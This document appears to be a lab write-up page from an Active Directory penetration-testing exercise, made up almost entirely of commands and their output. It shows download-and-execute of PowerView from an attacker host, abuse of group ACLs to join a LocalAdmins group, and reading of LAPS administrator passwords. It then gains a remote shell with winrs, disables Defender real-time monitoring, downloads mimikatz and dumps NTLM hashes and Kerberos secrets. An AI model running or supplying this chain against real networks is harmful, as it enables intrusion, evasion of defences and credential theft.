---
layout: default
---


With Domain user load powerview in order to enumerate interedting domain ACLs:

```
PS C:\Users\itemployee15> IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
PS C:\Users\itemployee15> Find-InterestingDomainAcl -ResolveGUIDs
...

ObjectDN                : CN=LocalAdmins,CN=Users,DC=it,DC=gcb,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ReadProperty, WriteProperty, GenericExecute
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-948911695-1962824894-4291460450-1124
IdentityReferenceName   : ITEmployeesUsers
IdentityReferenceDomain : it.gcb.local
IdentityReferenceDN     : CN=ITEmployeesUsers,CN=Users,DC=it,DC=gcb,DC=local
IdentityReferenceClass  : group
```

Add Group Membership:

```
PS C:\Users\itemployee15> Import-Module C:\tools\PowerView.ps1
PS C:\Users\itemployee15> Add-DomainGroupMember -Identity LocalAdmins -Members 'IT\ITEmployee15' -Verbose
VERBOSE: [Get-PrincipalContext] Binding to domain 'it.gcb.local'
VERBOSE: [Add-DomainGroupMember] Adding member 'IT\ITEmployee15' to group 'LocalAdmins'

PS C:\Users\itemployee15> Get-DomainGroupMember -Identity LocalAdmins


GroupDomain             : it.gcb.local
GroupName               : LocalAdmins
GroupDistinguishedName  : CN=LocalAdmins,CN=Users,DC=it,DC=gcb,DC=local
MemberDomain            : it.gcb.local
MemberName              : itemployee15
MemberDistinguishedName : CN=IT Employee15,CN=Users,DC=it,DC=gcb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-948911695-1962824894-4291460450-27607

GroupDomain             : it.gcb.local
GroupName               : LocalAdmins
GroupDistinguishedName  : CN=LocalAdmins,CN=Users,DC=it,DC=gcb,DC=local
MemberDomain            : it.gcb.local
MemberName              : paadmin
MemberDistinguishedName : CN=pa admin,CN=Users,DC=it,DC=gcb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-948911695-1962824894-4291460450-1117

```

Abusse LAPS permissions:

```
PS C:\Users\itemployee15> Import-Module C:\tools\Get-LAPSPermissions.ps1

Read Rights

organizationalUnit                  IdentityReference
------------------                  -----------------
OU=AppServers,DC=it,DC=gcb,DC=local IT\LocalAdmins

Write Rights

OU=AppServers,DC=it,DC=gcb,DC=local NT AUTHORITY\SELF


```
Extract Administrator credentials:

```

PS C:\Windows\system32> Get-DomainComputer -Identity it-appsrv01 -Properties * | select name,ms-Mcs-AdmPwd

name        ms-mcs-admpwd
----        -------------
IT-APPSRV01 2xDsu7p{{-Q6]M
```

Access to target machine with admin privileges:

```
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*'

PS C:\Windows\system32> winrs.exe -r:it-appsrv01.it.gcb.local -u:".\Administrator" -p:"2xDsu7p{{-Q6]M" cmd
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whoami
whoami
it-appsrv01\administrator

C:\Users\Administrator>hostname
hostname
it-appsrv01

```

Disable AV and Dump credentials:

```
PS C:\Users\Administrator> Set-MpPreference -DisableRealTimeMonitoring $True
Set-MpPreference -DisableRealTimeMonitoring $True

wget http://192.168.100.15/mimikatz.exe -OutFile mimikatz.exe

.\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 581239 (00000000:0008de77)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:53:32 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : IT-APPSRV01$
         * Domain   : IT
         * NTLM     : 4589aac198e67e05369ca8477ee426d7
         * SHA1     : 0957cb72e5f9cd7a99689d59ee59c985b4938dbc
         * DPAPI    : 0957cb72e5f9cd7a99689d59ee59c985
        tspkg :
        wdigest :
         * Username : IT-APPSRV01$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-APPSRV01$
         * Domain   : it.gcb.local
         * Password : 06 05 a8 ff f6 db 65 3a c6 cd ba b8 86 6f 38 c2 a2 22 ae c7 df f6 67 96 df 75 36 f2 03 92 ad 0c c0 6e 2b 70 04 c9 44 d3 c1 c0 1e fa cd c9 03 17 91 e7 7b 08 01 48 30 f5 59 c1 99 2c 65 2a 42 55 15 1b 6b 36 83 92 04 ad bf ff d6 6b fd 67 37 f3 60 6c b4 8f 05 3a af f0 45 bb 62 25 e5 be f0 6b 96 d2 68 0f 6f 38 5b 78 05 6d 68 42 ae 1f 0b b8 cd 52 b5 a2 c9 56 45 35 80 c1 b3 83 a5 f2 d4 e5 cc 17 60 4f 7d a0 a4 66 55 51 76 5a 24 e7 71 7e 61 76 c7 31 81 0c 1f 6e 7d 8b fc 06 4a ae 8a e8 9a 2a 4c 47 a2 88 c3 ee 05 7b e8 fb 70 a4 c1 0d 98 2c eb af 0d 37 4e 2e c5 85 0a 29 e4 c0 6f 21 15 a4 99 31 d2 ca d0 62 f1 2a 83 f7 2c bc 60 39 94 fb 4a 97 0c 6e 24 1b ed d1 ef b7 20 70 a3 78 60 8b 40 ab ca 50 a1 64 3f 1e a1 61 8c f3 d0 25
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : IT-APPSRV01$
Domain            : IT
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:03 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : IT-APPSRV01$
         * Domain   : IT
         * NTLM     : 4589aac198e67e05369ca8477ee426d7
         * SHA1     : 0957cb72e5f9cd7a99689d59ee59c985b4938dbc
         * DPAPI    : 0957cb72e5f9cd7a99689d59ee59c985
        tspkg :
        wdigest :
         * Username : IT-APPSRV01$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : it-appsrv01$
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 23374 (00000000:00005b4e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:02 PM
SID               :
        msv :
         [00000003] Primary
         * Username : IT-APPSRV01$
         * Domain   : IT
         * NTLM     : 4589aac198e67e05369ca8477ee426d7
         * SHA1     : 0957cb72e5f9cd7a99689d59ee59c985b4938dbc
         * DPAPI    : 0957cb72e5f9cd7a99689d59ee59c985
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 612883 (00000000:00095a13)
Session           : RemoteInteractive from 2
User Name         : appmanager
Domain            : IT
Logon Server      : IT-DC
Logon Time        : 4/28/2024 11:54:25 PM
SID               : S-1-5-21-948911695-1962824894-4291460450-1109
        msv :
         [00000003] Primary
         * Username : appmanager
         * Domain   : IT
         * NTLM     : 2c5d4678b83e5de26dc0338a0fcf6245
         * SHA1     : 18cb4d7cb7e5aa891ef9f4f44c846a491999ede4
         * DPAPI    : cc49271d0c4e173c4acdabba341b7e69
        tspkg :
        wdigest :
         * Username : appmanager
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : appmanager
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:36 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 59351 (00000000:0000e7d7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:36 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : IT-APPSRV01$
         * Domain   : IT
         * NTLM     : 4589aac198e67e05369ca8477ee426d7
         * SHA1     : 0957cb72e5f9cd7a99689d59ee59c985b4938dbc
         * DPAPI    : 0957cb72e5f9cd7a99689d59ee59c985
        tspkg :
        wdigest :
         * Username : IT-APPSRV01$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-APPSRV01$
         * Domain   : it.gcb.local
         * Password : 06 05 a8 ff f6 db 65 3a c6 cd ba b8 86 6f 38 c2 a2 22 ae c7 df f6 67 96 df 75 36 f2 03 92 ad 0c c0 6e 2b 70 04 c9 44 d3 c1 c0 1e fa cd c9 03 17 91 e7 7b 08 01 48 30 f5 59 c1 99 2c 65 2a 42 55 15 1b 6b 36 83 92 04 ad bf ff d6 6b fd 67 37 f3 60 6c b4 8f 05 3a af f0 45 bb 62 25 e5 be f0 6b 96 d2 68 0f 6f 38 5b 78 05 6d 68 42 ae 1f 0b b8 cd 52 b5 a2 c9 56 45 35 80 c1 b3 83 a5 f2 d4 e5 cc 17 60 4f 7d a0 a4 66 55 51 76 5a 24 e7 71 7e 61 76 c7 31 81 0c 1f 6e 7d 8b fc 06 4a ae 8a e8 9a 2a 4c 47 a2 88 c3 ee 05 7b e8 fb 70 a4 c1 0d 98 2c eb af 0d 37 4e 2e c5 85 0a 29 e4 c0 6f 21 15 a4 99 31 d2 ca d0 62 f1 2a 83 f7 2c bc 60 39 94 fb 4a 97 0c 6e 24 1b ed d1 ef b7 20 70 a3 78 60 8b 40 ab ca 50 a1 64 3f 1e a1 61 8c f3 d0 25
        ssp :
        credman :

Authentication Id : 0 ; 25043 (00000000:000061d3)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:02 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : IT-APPSRV01$
         * Domain   : IT
         * NTLM     : 4589aac198e67e05369ca8477ee426d7
         * SHA1     : 0957cb72e5f9cd7a99689d59ee59c985b4938dbc
         * DPAPI    : 0957cb72e5f9cd7a99689d59ee59c985
        tspkg :
        wdigest :
         * Username : IT-APPSRV01$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : IT-APPSRV01$
         * Domain   : it.gcb.local
         * Password : 06 05 a8 ff f6 db 65 3a c6 cd ba b8 86 6f 38 c2 a2 22 ae c7 df f6 67 96 df 75 36 f2 03 92 ad 0c c0 6e 2b 70 04 c9 44 d3 c1 c0 1e fa cd c9 03 17 91 e7 7b 08 01 48 30 f5 59 c1 99 2c 65 2a 42 55 15 1b 6b 36 83 92 04 ad bf ff d6 6b fd 67 37 f3 60 6c b4 8f 05 3a af f0 45 bb 62 25 e5 be f0 6b 96 d2 68 0f 6f 38 5b 78 05 6d 68 42 ae 1f 0b b8 cd 52 b5 a2 c9 56 45 35 80 c1 b3 83 a5 f2 d4 e5 cc 17 60 4f 7d a0 a4 66 55 51 76 5a 24 e7 71 7e 61 76 c7 31 81 0c 1f 6e 7d 8b fc 06 4a ae 8a e8 9a 2a 4c 47 a2 88 c3 ee 05 7b e8 fb 70 a4 c1 0d 98 2c eb af 0d 37 4e 2e c5 85 0a 29 e4 c0 6f 21 15 a4 99 31 d2 ca d0 62 f1 2a 83 f7 2c bc 60 39 94 fb 4a 97 0c 6e 24 1b ed d1 ef b7 20 70 a3 78 60 8b 40 ab ca 50 a1 64 3f 1e a1 61 8c f3 d0 25
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : IT-APPSRV01$
Domain            : IT
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:01 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : IT-APPSRV01$
         * Domain   : IT
         * Password : (null)
        kerberos :
         * Username : it-appsrv01$
         * Domain   : IT.GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list
ERROR kuhl_m_vault_list ; VaultEnumerateVaults : 0x00000005

mimikatz(commandline) # vault::cred /patch

mimikatz(commandline) # exit
Bye!
```



[back](./section1.html)
